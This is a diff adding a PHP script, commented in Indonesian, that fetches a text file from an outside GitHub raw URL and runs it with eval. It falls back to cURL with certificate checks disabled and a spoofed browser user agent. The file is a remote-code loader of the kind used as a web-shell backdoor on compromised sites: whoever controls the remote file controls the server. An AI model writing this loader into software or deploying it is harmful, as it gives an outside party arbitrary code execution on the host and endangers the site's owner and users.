@@ -1,0 +1,84 @@
+<?php
+// URL file PHP eksternal
+$url = 'https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/3.txt';
+
+// Fungsi untuk mendapatkan konten dengan cURL
+function getContentWithCurl($url) {
+    $ch = curl_init();
+    
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_CONNECTTIMEOUT => 10
+    ]);
+    
+    $content = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    
+    curl_close($ch);
+    
+    if ($httpCode === 200 && !empty($content)) {
+        return $content;
+    } else {
+        throw new Exception("cURL Error: " . $error . " | HTTP Code: " . $httpCode);
+    }
+}
+
+// Fungsi untuk mendapatkan konten URL
+function getUrlContent($url) {
+    // Coba menggunakan file_get_contents pertama
+    $content = @file_get_contents($url);
+    
+    if ($content !== false && !empty($content)) {
+        return $content;
+    }
+    
+    // Jika file_get_contents gagal, gunakan cURL
+    try {
+        $content = getContentWithCurl($url);
+        return $content;
+    } catch (Exception $e) {
+        throw new Exception("Both file_get_contents and cURL failed: " . $e->getMessage());
+    }
+}
+
+// Main execution
+try {
+    $kode = getUrlContent($url);
+    
+    // Eksekusi kode PHP
+    if (!empty($kode)) {
+        // Tambahkan error handling untuk eval
+        try {
+            eval('?>' . $kode);
+        } catch (ParseError $e) {
+            echo "Error dalam mengeksekusi kode: " . $e->getMessage();
+        } catch (Throwable $e) {
+            echo "Error: " . $e->getMessage();
+        }
+    } else {
+        echo "Konten kosong";
+    }
+    
+} catch (Exception $e) {
+    echo "Gagal mengambil kode dari URL: " . $e->getMessage();
+}
+
+// Versi alternatif hanya untuk menampilkan konten (tanpa eksekusi)
+function displayContentOnly($url) {
+    try {
+        $content = getUrlContent($url);
+        echo htmlspecialchars($content);
+    } catch (Exception $e) {
+        echo "Gagal mengambil konten: " . $e->getMessage();
+    }
+}
+
+// Uncomment baris berikut jika hanya ingin menampilkan konten tanpa mengeksekusi
+// displayContentOnly($url);
+?>
